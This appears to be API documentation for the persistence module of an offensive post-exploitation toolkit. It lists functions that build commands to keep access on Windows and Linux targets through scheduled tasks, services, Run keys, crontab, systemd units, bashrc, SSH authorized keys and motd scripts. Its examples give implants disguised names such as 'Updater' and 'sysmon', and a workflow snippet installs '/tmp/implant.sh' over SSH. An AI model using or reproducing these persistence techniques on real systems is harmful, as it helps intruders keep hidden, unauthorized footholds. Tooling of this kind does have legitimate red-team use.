# Persistence API

Craft persistence commands for Windows and Linux targets.  All functions return **command strings** — nothing is executed locally.

## Windows Functions

| Function | Description |
|----------|-------------|
| `schtask_command(name, cmd, trigger="ONLOGON", user=None) -> str` | Create a scheduled task (runs as SYSTEM by default) |
| `service_command(name, bin_path, display_name=None) -> str` | `sc create` a persistent auto-start service |
| `runkey_command(name, value, hive="HKCU") -> str` | Add a `Run` registry key entry |

## Linux Functions

| Function | Description |
|----------|-------------|
| `crontab_command(cmd, schedule="@reboot", user="") -> list[str]` | Install a crontab entry (user or system-wide) |
| `systemd_user_service(name, exec_start, description=..., restart="always", system_wide=False) -> list[str]` | Install a systemd service unit |
| `bashrc_persistence(cmd, profile=False) -> list[str]` | Append to `~/.bashrc` (and optionally `~/.profile`) |
| `ssh_authorized_key(public_key, user_home="~") -> list[str]` | Install an SSH public key for passwordless access |
| `motd_persistence(cmd) -> list[str]` | Inject a command into `/etc/update-motd.d/` (requires root) |

## Python Usage

```python
from ofx.api import persistence

# Windows
print(persistence.schtask_command("Updater", r"C:\Temp\b.exe"))
print(persistence.service_command("WinUpdate", r"C:\Temp\svc.exe"))
print(persistence.runkey_command("Updater", r"C:\Temp\b.exe"))

# Linux
for cmd in persistence.crontab_command("/tmp/beacon.sh"):
    print(cmd)

for cmd in persistence.systemd_user_service("sysmon", "/tmp/beacon.sh"):
    print(cmd)

for cmd in persistence.ssh_authorized_key("ssh-ed25519 AAAA..."):
    print(cmd)
```

## Workflow Snippet

```yaml
steps:
  - name: install crontab persistence
    script: |
      from ofx.api import persistence
      from ofx.api.post.runners.ssh import PostSSH

      runner = PostSSH(host="{{ inputs.target }}", user="{{ secrets.user }}")
      for cmd in persistence.crontab_command("/tmp/implant.sh", schedule="@reboot"):
          print(runner.run(cmd))
```
